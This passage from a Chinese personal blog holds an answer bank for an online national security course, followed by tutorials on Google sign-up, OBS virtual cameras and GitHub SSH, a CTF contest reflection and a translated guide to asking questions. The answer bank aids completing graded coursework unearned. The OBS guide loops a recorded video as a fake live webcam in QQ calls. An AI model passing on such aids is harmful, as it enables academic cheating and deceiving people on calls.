<p>2【单选题】（A）是指一个国家在建设、运营、维护和使用网络，以及在网络安全的监督管理方面所拥有的自主决定权。</p>
<p>A、网络空间主权</p>
<p>B、网络监督权</p>
<p>C、网络自主权</p>
<p>D、网络管理权</p>
<p>9.2</p>
<p>1【判断题】网络安全包括网络基础设施、网络运行与服务、信息安全等方面，是保障和促进信息社会健康发展的基础。</p>
<p>我的答案：√</p>
<p>2【判断题】《网络安全审查办法》首次在我国法律层面明确关键信息基础设施的概念，并对关键信息基础设施安全防护提出专门要求。</p>
<p>我的答案：X</p>
<p>9.3</p>
<p>1【单选题】（B）已经成为继陆地、海洋、天空、外太空之外的第五空间。</p>
<p>A、河流</p>
<p>B、网络空间</p>
<p>C、冰川</p>
<p>D、地壳</p>
<p>2【判断题】网络上各种思想文化相互激荡、交锋，优秀传统文化和主流价值观面临冲击。</p>
<p>我的答案：√</p>
<p>9.4</p>
<p>1【判断题】关键核心技术是国之重器，对推动我国经济高质量发展、保障国家安全都具有十分重要的意义。</p>
<p>我的答案：√</p>
<p>2【判断题】《网络安全法》由国家互联网信息办公室、国家发改委等12个部门联合发布，2020年6月1日起正式生效。</p>
<p>我的答案：X</p>
<p>10.1</p>
<p>1【单选题】生态安全是指一个国家具有支撑国家生存发展的较为完整不受威胁的（B），以及应对内外重大生态问题的能力。</p>
<p>A、生存环境</p>
<p>B、生态系统</p>
<p>C、生态条件</p>
<p>D、生态指标</p>
<p>2【单选题】生态系统作为一个整体，既是人类的生存空间又是人类获取生产生活资源的来源。对国家来说，要获得充分的资源不但取决于国内的生态安全，而且取决于（C）。</p>
<p>A、自身生态安全</p>
<p>B、人际生态安全</p>
<p>C、国际和全球生态安全</p>
<p>D、社会生态安全</p>
<p>10.2</p>
<p>1【判断题】水土流失、地下水严重超采、土壤退化、面源污染加重已成为制约农业可持续发展的突出矛盾。</p>
<p>我的答案：√</p>
<p>2【判断题】我国土壤污染南方重于北方，长三角珠、珠三角和东北老工业基地等部分区域土壤污染问题较为突出，西南和中南地区土壤重金属超标范围大。</p>
<p>我的答案：√</p>
<p>10.3</p>
<p>1【单选题】严守水资源“三条红线”的“红线”不包括（D）。</p>
<p>A、开发利用</p>
<p>B、用水效率</p>
<p>C、水功能区限制纳污</p>
<p>D、运用技术处理废水</p>
<p>2【判断题】生态修复是一项系统工程，短期内难以见效，应坚持绿色发展，改善生态环境。</p>
<p>我的答案：√</p>
<p>11.1</p>
<p>1【单选题】（C）是指一个国家或地区可以保质保量、及时持续、稳定可靠、经济合理地获取所需的自然资源及资源性产品的状态或能力。</p>
<p>A、原料安全</p>
<p>B、源头安全</p>
<p>C、资源安全</p>
<p>D、材料安全</p>
<p>2【单选题】资源安全包括（B）、质量、结构、均衡和经济5个基本要素。</p>
<p>A、可再生</p>
<p>B、数量</p>
<p>C、可持续</p>
<p>D、质地</p>
<p>11.2</p>
<p>1【单选题】现代人们认为最具有战略意义的资源，包括（A）、生物资源、水资源、土地资源、海洋资源等。</p>
<p>A、矿产资源</p>
<p>B、生物资源</p>
<p>C、人才资源</p>
<p>D、住房资源</p>
<p>2【单选题】我国（B）所称土地，是指中华人民共和国各行政区域管理范围内的所有土地，按其利用类别分为农用地、建设用地和未用地。</p>
<p>A、《国家安全法》</p>
<p>B、《土地管理法》</p>
<p>C、《宪法》</p>
<p>D、《环境保护法》</p>
<p>11.3</p>
<p>1【单选题】当前，深圳、东莞等珠三角城市的土地开发强度都已超过国际公认的（A）警戒线。</p>
<p>A、0.3</p>
<p>B、0.4</p>
<p>C、0.25</p>
<p>D、0.35</p>
<p>2【单选题】中国的缺水类型，不包括（D）。</p>
<p>A、水资源总量缺乏的资源性缺水</p>
<p>B、由于特殊地理地质环境及缺乏存水设施导致的工程性缺水</p>
<p>C、由于排放废水等导致淡水资源污染而短缺的水质性缺水</p>
<p>D、由于气候灾害引起的干旱缺水</p>
<p>11.4</p>
<p>1【单选题】（B）是指人类社会生产和生活中废弃可回收利用的物资。</p>
<p>A、可利用资源</p>
<p>B、再生资源</p>
<p>C、可加工资源</p>
<p>D、环保资源</p>
<p>2【判断题】资源开发利用总体水平不高，是我国资源安全面临的突出问题。</p>
<p>我的答案：√</p>
<p>12.1</p>
<p>1【单选题】1945年8月6日和9日，（D）在日本广岛和长崎投放代号为“小男孩”和“胖子”两枚原子弹，迫使日本于8月15日宣布投降。</p>
<p>A、俄国</p>
<p>B、英国</p>
<p>C、法国</p>
<p>D、美国</p>
<p>2【单选题】1964年10月16日，中国第一颗原子弹在（C）的一声巨响，宣告着中国有力地打破了超级大国的核垄断和核讹诈,提高了中国的国际地位。</p>
<p>A、西昌</p>
<p>B、酒泉</p>
<p>C、罗布泊</p>
<p>D、太原</p>
<p>12.2</p>
<p>1【单选题】（B）又称为原子能反应堆或反应堆，是能维持可控自持链式核裂变反应，以实现核能利用的装置。</p>
<p>A、堆芯</p>
<p>B、核反应堆</p>
<p>C、核材料</p>
<p>D、原子能</p>
<p>2【单选题】核电厂除了正常供电系统外，还设置有应急电源，由数台（C）发电机组和相应的供电系统组成。</p>
<p>A、煤炭</p>
<p>B、风能</p>
<p>C、柴油</p>
<p>D、潮汐</p>
<p>12.3</p>
<p>1【单选题】核事故是指大型核设施发生的意外事件，核事故共分为（D）级。</p>
<p>A、4</p>
<p>B、5</p>
<p>C、6</p>
<p>D、7</p>
<p>2【单选题】2011年，日本福岛核电站泄漏属于核事故中的（D）级。</p>
<p>A、4</p>
<p>B、5</p>
<p>C、6</p>
<p>D、7</p>
<p>12.4</p>
<p>1【单选题】（A）于2014年12月19日发布了《核安全文化政策声明》，在全行业推进核安全文化建设。</p>
<p>A、中国</p>
<p>B、英国</p>
<p>C、法国</p>
<p>D、美国</p>
<p>2【判断题】核事故应急管理是指在事故应急时采取的核事故对策、应急准备、应急措施及事故后恢复行动的管理活动。</p>
<p>我的答案：√</p>
<p>13.1</p>
<p>1【单选题】（C）即指一个主权国家管辖范围之外的境外利益，也就是国家的边界和海关之外的各类利益。</p>
<p>A、边界利益</p>
<p>B、海关利益</p>
<p>C、海外利益</p>
<p>D、外国利益</p>
<p>2【判断题】海外利益安全是指国家依法采取必要措施，保护海外中国公民、组织和机构的安全和正当权益，保护国家的海外利益不受威胁和侵害。</p>
<p>我的答案：√</p>
<p>13.2</p>
<p>1【单选题】国际大环境对我国维护海外利益安全总体有利，但部分地区（D）对我国企业和公民在当地发展生存带来严峻挑战。</p>
<p>A、基础设施落后</p>
<p>B、住房匮乏</p>
<p>C、粮食短缺</p>
<p>D、局势动荡</p>
<p>2【单选题】（B）是考察东道国政府稳定性和质量的重要依据，是我国海外利益扩展重要的安全因素。</p>
<p>A、经济风险</p>
<p>B、政治风险</p>
<p>C、文化风险</p>
<p>D、网络风险</p>
<p>13.3</p>
<p>1【单选题】“非战争军事行动”原本是一个特定称谓，在1993年（B）陆军《作战纲要》中首次提出。</p>
<p>A、俄国</p>
<p>B、美国</p>
<p>C、英国</p>
<p>D、法国</p>
<p>2【判断题】面对日益复杂的国际和地区安全风险，任何国家都难以凭一己之力维护海外利益安全，同舟共济、携手合作是必然选择。</p>
<p>我的答案：√</p>
<p>14.1</p>
<p>1【单选题】中国载人航天工程于（C）正式启动，中国已成为能够独立开展载人航天活动、掌握空间出舱活动技术的世界航天大国。</p>
<p>A、1990年</p>
<p>B、1991年</p>
<p>C、1992年</p>
<p>D、1993年</p>
<p>2【判断题】外层空间、国际海底区域和极地等新型领域，可通过国际申请，专属于世界上任何一个国家。</p>
<p>我的答案：X</p>
<p>15.1</p>
<p>1【判断题】公民和组织应当自觉履行《宪法》《国家安全法》规定的维护国家安全的法律义务。</p>
<p>我的答案：√</p>
<p>2【判断题】维护国家安全的根基在人民、力量在人民、血脉在人民。只有依靠人民，才能切实有力地维护国家安全。</p>
<p>我的答案：√</p>
]]></content>
      <categories>
        <category>技术教程</category>
      </categories>
      <tags>
        <tag>线上课答案库</tag>
        <tag>超星学习通</tag>
        <tag>国家安全教育</tag>
      </tags>
  </entry>
  <entry>
    <title>手把手教你注册Google账号</title>
    <url>/posts/f286f4f8.html</url>
    <content><![CDATA[<h1 id="Google账号的注册教程"><a href="#Google账号的注册教程" class="headerlink" title="Google账号的注册教程"></a>Google账号的注册教程</h1><blockquote>
<p>本部分基于<a class="link"   href="https://blog.csdn.net/qq_45138120/article/details/131347452#/" >这篇文章<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>进行编辑，致敬</p>
</blockquote>
<ol>
<li>首先打开浏览器，然后进入设置把浏览器设置成英文语言，来提高成功率</li>
</ol>
<p>特别说明一下，<span style="color:#FF0000;">是浏览器的总语言，在浏览器设置里，而不只是设置当前页面的语言</span></p>
<ol>
<li>我们使用浏览器打开谷歌邮箱官网（<a class="link"   href="http://gmail.google.com/" >http://gmail.google.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ），进入谷歌邮箱的登录主页，我们点击左下方的创建账号按钮，选择个人用途（为我自己）</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Google/Google1.png"
                      alt="账号注册"
                ></p>
<ol start="3">
<li>在进入的界面我们不要着急填写资料，我们先修改语言，点击左下方的简体中文。这个时候，会弹出国家语言列表，我们选择“English（United States）”。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Google/Google2.png"
                      alt="语言"
                ></p>
<ol start="4">
<li>这个时候，界面会变成英语。输入姓氏和名字，点击 Next</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Google/Google3.png"
                      alt="在这里插入图片描述"
                ></p>
<ol start="4">
<li>选择月份、日、年、性别，点击Next</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Google/Google4.png"
                      alt="日期"
                ></p>
<ol start="5">
<li>选择Gmail邮箱地址，前两个是随机出的邮箱地址，可以勾选第三个自定义邮箱地址，输入邮箱地址后，点击 Next</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Google/Google5.png"
                      alt="在这里插入图片描述"
                ></p>
<ol start="6">
<li><p>输入密码，确认密码后，点击 Next</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Google/Google6.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
<li><p>添加恢复电子邮件，账号异常或锁定时，Google 可以通过恢复电子邮件联系您。直接点击 Skip 跳过</p>
</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Google/Google7.png"
                      alt="在这里插入图片描述"
                ></p>
<ol start="8">
<li>选择中国，填写自己的手机号，点击Next</li>
</ol>
<p>关于手机号无法用于验证的问题，可以看这一位大佬的帖子：<a class="link"   href="https://blog.csdn.net/qaqwqaqwq/article/details/130442226#/" >https://blog.csdn.net/qaqwqaqwq/article/details/130442226#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>这个问题与我一开始写的第一步相呼应，开头切换英文主要就是为了解决这边</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Google/Google8.png"
                      alt="在这里插入图片描述"
                ></p>
<ol start="9">
<li>确认账户信息页面，没问题的话，点击 Next</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Google/Google9.png"
                      alt="在这里插入图片描述"
                ></p>
<ol start="10">
<li>隐私条款确认，拉取到底部，点击 I agree 我同意</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Google/Google10.png"
                      alt="image-20231223005705473"
                ></p>
<ol start="11">
<li>如图，出现此界面，说明 Google 邮箱创建成果</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Google/Google11.png"
                      alt="在这里插入图片描述"
                ></p>
<p>注：创建失败时</p>
<ul>
<li>手机号码已经注册过</li>
<li>在注册时，将语言设置为英语，成功率高</li>
<li>切换节点</li>
<li>过会再试试</li>
</ul>
]]></content>
      <categories>
        <category>技术教程</category>
      </categories>
      <tags>
        <tag>手把手教程系列</tag>
        <tag>Google-account</tag>
      </tags>
  </entry>
  <entry>
    <title>手把手教你用新版OBS虚拟摄像头</title>
    <url>/posts/f885f05a.html</url>
    <content><![CDATA[<blockquote>
<p>本教程基于B站<a class="link"   href="https://www.bilibili.com/read/cv11603378/%E7%BC%96%E5%86%99" >https://www.bilibili.com/read/cv11603378/编写<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<h1 id="零、前言说明"><a href="#零、前言说明" class="headerlink" title="零、前言说明"></a>零、前言说明</h1><p><strong>本教程仅适用于最新版OBS，主版本号30（版本26基本与此一样）</strong></p>
<h1 id="一、下载安装"><a href="#一、下载安装" class="headerlink" title="一、下载安装"></a>一、下载安装</h1><ol>
<li><p>下载方式有两种：</p>
</li>
<li><ul>
<li><p><strong>官网下载：</strong><a class="link"   href="https://obsproject.com/" >https://obsproject.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>服务器在国外，<strong>速度可能较慢</strong>，你可以尝试使用下面的方法下载。</p>
</li>
<li><p><strong>国内镜像：</strong><a class="link"   href="https://mirror.tuna.tsinghua.edu.cn/" >https://mirror.tuna.tsinghua.edu.cn<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>清华大学TUNA镜像站，右侧栏<strong>“获取下载链接”–应用软件–OBS–选择合适的版本下载</strong>即可（注意选择那个<strong>带有“Installer”字样的</strong>，括号里是exe，那个是安装包，zip是便携版）。</p>
</li>
</ul>
</li>
<li><p>打开安装包，一路下一步安装就行，与普通软件安装没什么两样，安装位置任意选。</p>
</li>
</ol>
<h1 id="二、OBS的简单配置"><a href="#二、OBS的简单配置" class="headerlink" title="二、OBS的简单配置"></a>二、OBS的简单配置</h1><p>打开OBS Studio软件。</p>
<ul>
<li><p>可以使用自动配置向导，选择最后一项<strong>“我只使用虚拟摄像机”</strong>即可。</p>
<p>注：OBS 26版本无此选项，此时你应该选择“取消”</p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/obs/image-20231210203435938.png"
                      alt="image-20231210203435938"
                ></p>
<p>之后选择<strong>“下一步”–“应用设置”</strong></p>
<ul>
<li><p>（可选步骤）修改虚拟摄像头的输出大小</p>
<p>在OBS主程序菜单栏左上角<strong>“文件”</strong>中，找到<strong>“设置”</strong></p>
<p>你可以在“设置”窗口的“视频”选项卡中找到输出分辨率和帧率的设置</p>
<p>电脑配置较差的用户可以参考我的设置</p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/obs/image-20231210203512874.png"
                      alt="image-20231210203512874"
                ></p>
<p><strong>不明白各参数什么意思的可以直接照搬我的设置，或者保持默认不动。</strong></p>
<h1 id="三、准备虚拟视频"><a href="#三、准备虚拟视频" class="headerlink" title="三、准备虚拟视频"></a>三、准备虚拟视频</h1><p>实现录制一个视频，用来虚拟化</p>
<p>注意此视频将会用作虚拟视频效果</p>
<h1 id="四、编辑和启动虚拟摄像头"><a href="#四、编辑和启动虚拟摄像头" class="headerlink" title="四、编辑和启动虚拟摄像头"></a>四、编辑和启动虚拟摄像头</h1><ul>
<li>回到主界面，在下方的<strong>“来源”栏下点击“+”</strong>加号，添加一个<strong>“媒体源”</strong></li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/obs/image-20231210203640263.png"
                      alt="image-20231210203640263"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/obs/image-20231210203654429.png"
                      alt="image-20231210203654429"
                ></p>
<ul>
<li><strong>点击“浏览”，选择刚才录制好的视频文件</strong></li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/obs/image-20231210203715094.png"
                      alt="image-20231210203715094"
                ></p>
<p>选择好文件后，<strong>一定记得勾选“循环”！</strong></p>
<p>此时上方可能不会立刻出现视频的预览，<strong>点击“确定”，视频就出现了</strong>。</p>
<p>如果没有视频显示在预览的画面里，尝试修改<strong>“在可用时使用硬件编码”</strong>这一选项</p>
<p>注：如果想再次调出这个界面，双击“来源”栏里的“媒体源”即可。</p>
<ul>
<li>理论上的视频应该是铺满画面的，如果没有，那就<strong>右键视频的画面–变换–比例适配屏幕</strong>。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/obs/image-20231210203940096.png"
                      alt="image-20231210203940096"
                ></p>
<ul>
<li><p>下面来启动虚拟摄像头</p>
<p>单击主界面<strong>右下角“控件”一栏里的“启动虚拟摄像机”</strong></p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/obs/image-20231210203956900.png"
                      alt="image-20231210203956900"
                ></p>
<h1 id="五、在第三方软件里使用虚拟摄像头"><a href="#五、在第三方软件里使用虚拟摄像头" class="headerlink" title="五、在第三方软件里使用虚拟摄像头"></a>五、在第三方软件里使用虚拟摄像头</h1><p>这里以<strong>QQ</strong>电脑版为例</p>
<ul>
<li>在<strong>QQ</strong>里找到<strong>“设置”</strong></li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/obs/image-20231210204103698.png"
                      alt="image-20231210204103698"
                ></p>
<ul>
<li>在“视频”选项卡里找到<strong>“摄像头”</strong>，设置为<strong>“OBS Virtual Camera”</strong></li>
<li>打开预览画面</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/obs/image-20231210204210755.png"
                      alt="image-20231210204210755"
                ></p>
<p>此时上面应该能显示出你在OBS中设置好的画面，关闭设置界面即可。</p>
<p>此时大功告成了，QQ视频里会循环播放你录制好的视频</p>
<ul>
<li>如果出现如下画面，请检查是否<strong>在OBS内“启动虚拟摄像机”</strong></li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/obs/image-20231210204307899.png"
                      alt="image-20231210204307899"
                ></p>
<ul>
<li><p>如果卡了，没画面，则需要打开obs的设置</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/obs/image-20231210204357713.png"
                      alt="image-20231210204357713"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/obs/image-20231210204448834.png"
                      alt="image-20231210204448834"
                ></p>
</li>
</ul>
<p>改为800*600比例</p>
<br/>

<p>其他软件将默认摄像头设备改为“OBS Virtual Camera”即可。</p>
]]></content>
      <categories>
        <category>技术教程</category>
      </categories>
      <tags>
        <tag>手把手教程系列</tag>
        <tag>OBS</tag>
      </tags>
  </entry>
  <entry>
    <title>扔掉你的watt toolikt！使用ssh拉取推送Github代码~</title>
    <url>/posts/4561bfdb.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作者在 Github 拉取代码推送代码的时候，一直使用的是 watt toolikt，在昨天尝试给服务器挂代理的时候，配置了 ssh 代理，可以实现仅需要代理 ssh 即可正常拉取推送 Github 代码，所以作者决定使用 ssh 拉取推送 Github 代码。</p>
<p>此外，作者在上一篇文章中介绍了 ssh 代理脚本，请移步<a href="/posts/65dfe81d.html">基于 Ed25519 算法的配置 Github SSH 的 shell 脚本 | W1ndys 小屋</a></p>
<h3 id="生成秘钥"><a href="#生成秘钥" class="headerlink" title="生成秘钥"></a>生成秘钥</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t ed25519 -C <span class="string">&quot;your_email@example.com&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>生成一个 <code>id_ed25519</code> 和 <code>id_ed25519.pub</code> 文件，将 <code>id_ed25519.pub</code> 文件的内容添加到 Github 的 SSH 密钥中。</p>
<h3 id="配置-ssh-代理"><a href="#配置-ssh-代理" class="headerlink" title="配置 ssh 代理"></a>配置 ssh 代理</h3><p>在 <code>~/.ssh/config</code> 文件中添加以下内容：</p>
<div class="code-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">    Hostname ssh.github.com</span><br><span class="line">    Port 443</span><br><span class="line">    User git</span><br></pre></td></tr></table></figure></div>

<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure></div>

<p>如果配置成功，会看到以下内容：</p>
<div class="code-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="code"><pre><span class="line">You&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure></div>

<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>之后挂上魔法就可以使用 ssh 拉取推送 Github 代码了。无需依赖 watt toolikt</p>
]]></content>
  </entry>
  <entry>
    <title>技能兴鲁2023职业技能大赛网络安全赛项比赛心得</title>
    <url>/posts/7c7bd47d.html</url>
    <content><![CDATA[<p>30个队伍排名第18还行，有一个队伍弃权没来，两个队伍作弊被ban了，顺延2名，最终第16，广外和南理的师傅太强了，山警的大哥被ban了不然也是前三<br>11月24就已经打完了，一直没来得及写心得</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/jnxl2023/1701356901716.jpg"
                      alt="1701356901716"
                ><br>可能是因为团队赛吧<br>感觉比科来打的好点<br>有好几个题都是差一点<br>我交了两个简单题，逆了一个misc的pyc，也是没拖后腿<br>misc这个题是很有意思的，压缩包有密码，可以暴力破解出来，然后三个附件，其中一个是一首诗，很有意思，但是不知道这首诗是有什么用，这题就差一点了，没做出来。<br>发现了自己还有很多东西没学没掌握好，re的花指令，动态调试，老东西直接秒了的题，我不会</p>
<p>见到了西邮的师傅</p>
<p>另外说一下对组委会的印象<br>评价是一坨稀烂<br>连个纪念品都没有，也没手提包，整场下来就给个参赛证，然后报告厅像个教室，甚至还不如我们的教室大（<br>进赛场之后桌子上一人一份伙食（一包奶一个面包一根火腿肠，我的天我们还以为这是早饭，没想到这是午饭）<br>中途上了一遍零食（好丽友＋一根火腿肠）爆笑如雷了，在济南都是组委包吃住，酒店随便吃的<br>还有更抽象的<br>上午10:30开赛，到时间准时开赛准时断电，布置赛场也偷工减料了吧，供电不足直接断电了，抢修了一个小时导致比赛延后了<br>然后中途上了一次电，信号屏蔽仪直接嘎嘣冒烟，当场炸了，还有好几位师傅的电源适配器给烧了（<del class="mask">byd这才是应急响应是吧</del></p>
<p>这也是裁判长最忙的一次，山警大哥应该是比赛过程中询问wp，说的很含糊然后就ban了，还有带手机被听见了，但是没被逮住，辗优就在我隔壁，很强的一个热点信号</p>
<p>三等奖，也算是没白来，威海那个去了大概能拿个一等，他们组委举办的也还行，就是路费太高了，没奖金没报销<br>总的来说还是得练，师傅们觉得一把梭的题我要搞半天</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>比赛心得</category>
        <category>省赛</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>技能兴鲁</tag>
      </tags>
  </entry>
  <entry>
    <title>提问的智慧</title>
    <url>/posts/fb3832f5.html</url>
    <content><![CDATA[<h1 id="提问的智慧"><a href="#提问的智慧" class="headerlink" title="提问的智慧"></a>提问的智慧</h1><p>How To Ask Questions The Smart Way</p>
<p>Copyright © 2001,2006,2014 Eric S. Raymond, Rick Moen 本指南英文版版权为 Eric S. Raymond, Rick Moen 所有。</p>
<p>原文网址:<a class="link"   href="http://www.catb.org/~esr/faqs/smart-questions.html" >http://www.catb.org/~esr/faqs/smart-questions.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Copyleft 2001 by D.H.Grand(nOBODY&#x2F;Ginux), 2010 by Gasolin, 2015 by Ryan Wu 本中文指南是基于原文 3.10 版以及 2010 年由 <a class="link"   href="https://github.com/gasolin" >Gasolin <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>所翻译版本的最新翻译；协助指出翻译问题，<strong>请</strong><a class="link"   href="https://github.com/ryanhanwu/smartquestions/issues/new" >发Issue<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><strong>，或直接</strong><a class="link"   href="https://github.com/ryanhanwu/smartquestions/compare/" >发Pull Request<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><strong>给我。</strong></p>
<p>本文另有简体中文版: <a class="link"   href="https://github.com/FredWe/How-To-Ask-Questions-The-Smart-Way/blob/master/README-zh_CN.mdWay/blob/master/README-zh_CN.md" >https://github.com/FredWe/How-To-Ask-Questions-The-Smart-Way/blob/master/README-zh_CN.mdWay/blob/master/README-zh_CN.md<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><font size=5><a class="link"   href="https://github.com/ryanhanwu/smartquestions/blob/master/history.md" >原文版本历史<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></font></p>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li><p><a href="#%E5%A3%B0%E6%98%8E"> 声明</a></p>
</li>
<li><p><a href="#%E7%AE%80%E4%BB%8B"> 简介</a></p>
</li>
<li><p><a href="#%E5%9C%A8%E6%8F%90%E9%97%AE%E4%B9%8B%E5%89%8D"> 在提问之前</a></p>
</li>
<li><p><a href="#%E5%BD%93%E4%BD%A0%E6%8F%90%E9%97%AE%E6%97%B6"> 当你提问时</a></p>
<ul>
<li><p><a href="#%E6%85%8E%E9%80%89%E6%8F%90%E9%97%AE%E7%9A%84%E8%AE%BA%E5%9D%9B"> 慎选提问的论坛</a></p>
</li>
<li><p><a href="#%E7%BD%91%E7%AB%99%E5%92%8CIRC%E8%AE%BA%E5%9D%9B"> 网站和IRC论坛</a></p>
</li>
<li><p><a href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%8C%E4%BD%BF%E7%94%A8%E9%A1%B9%E7%9B%AE%E9%82%AE%E4%BB%B6%E5%88%97%E8%A1%A8"> 第二步，使用项目邮件列表</a></p>
</li>
<li><p><a href="#%E4%BD%BF%E7%94%A8%E6%9C%89%E6%84%8F%E4%B9%89%E4%B8%94%E6%8F%8F%E8%BF%B0%E6%98%8E%E7%A1%AE%E7%9A%84%E6%A0%87%E9%A2%98"> 使用有意义且描述明确的标题</a></p>
</li>
<li><p><a href="#%E4%BD%BF%E9%97%AE%E9%A2%98%E5%AE%B9%E6%98%93%E5%9B%9E%E5%A4%8D"> 使问题容易回复</a></p>
</li>
<li><p><a href="#%E7%94%A8%E6%B8%85%E6%99%B0%E3%80%81%E6%AD%A3%E7%A1%AE%E3%80%81%E7%B2%BE%E5%87%86%E5%B9%B6%E5%90%88%E6%B3%95%E8%AF%AD%E6%B3%95%E7%9A%84%E8%AF%AD%E5%8F%A5">用清晰、正确、精准并合法语法的语句</a></p>
</li>
<li><p><a href="#%E4%BD%BF%E7%94%A8%E6%98%93%E4%BA%8E%E8%AF%BB%E5%8F%96%E4%B8%94%E6%A0%87%E5%87%86%E7%9A%84%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%8F%91%E9%80%81%E9%97%AE%E9%A2%98"> 使用易于读取且标准的文件格式发送问题</a></p>
</li>
<li><p><a href="#%E7%B2%BE%E7%A1%AE%E7%9A%84%E6%8F%8F%E8%BF%B0%E9%97%AE%E9%A2%98%E5%B9%B6%E8%A8%80%E4%B9%8B%E6%9C%89%E7%89%A9"> 精确的描述问题并言之有物</a></p>
</li>
<li><p><a href="#%E8%AF%9D%E4%B8%8D%E5%9C%A8%E5%A4%9A%E8%80%8C%E5%9C%A8%E7%B2%BE"> 话不在多而在精</a></p>
</li>
<li><p><a href="#%E5%88%AB%E5%8A%A8%E8%BE%84%E5%A3%B0%E7%A7%B0%E6%89%BE%E5%88%B0Bug"> 别动辄声称找到Bug</a></p>
</li>
<li><p><a href="#%E5%8F%AF%E4%BB%A5%E4%BD%8E%E5%A3%B0%E4%B8%8B%E6%B0%94%EF%BC%8C%E4%BD%86%E8%BF%98%E6%98%AF%E8%A6%81%E5%85%88%E5%81%9A%E5%8A%9F%E8%AF%BE"> 可以低声下气，但还是要先做功课</a></p>
</li>
<li><p><a href="#%E6%8F%8F%E8%BF%B0%E9%97%AE%E9%A2%98%E7%97%87%E7%8A%B6%E8%80%8C%E9%9D%9E%E7%8C%9C%E6%B5%8B"> 描述问题症状而非猜测</a></p>
</li>
<li><p><a href="#%E6%8C%89%E5%8F%91%E7%94%9F%E6%97%B6%E9%97%B4%E5%85%88%E5%90%8E%E5%88%97%E5%87%BA%E9%97%AE%E9%A2%98%E7%97%87%E7%8A%B6"> 按发生时间先后列出问题症状</a></p>
</li>
<li><p><a href="#%E6%8F%8F%E8%BF%B0%E7%9B%AE%E6%A0%87%E8%80%8C%E4%B8%8D%E6%98%AF%E8%BF%87%E7%A8%8B"> 描述目标而不是过程</a></p>
</li>
<li><p><a href="#%E5%88%AB%E8%A6%81%E6%B1%82%E4%BD%BF%E7%94%A8%E7%A7%81%E4%BA%BA%E7%94%B5%E9%82%AE%E5%9B%9E%E5%A4%8D"> 别要求使用私人电邮回复</a></p>
</li>
